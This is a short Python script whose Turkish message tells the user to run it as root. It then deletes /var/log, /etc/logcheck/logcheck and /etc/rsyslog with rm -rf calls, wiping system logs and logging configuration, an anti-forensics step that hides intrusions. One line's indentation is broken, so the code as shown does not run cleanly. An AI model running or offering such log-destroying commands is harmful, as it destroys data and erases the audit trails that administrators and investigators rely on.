import os
import time
a = 1
print("Program başlatılıyor...Hata almamak için kök(root) kullanıcıda çalıştırınız")
while a<10:
        a += 1
        time.sleep(1)
        if(a==3):
                os.system("rm -rf /var/log")
        if(a==6):
                os.system("rm -rf /etc/logcheck/logcheck")
         if(a==9):
                os.system("rm -rf /etc/rsyslog")
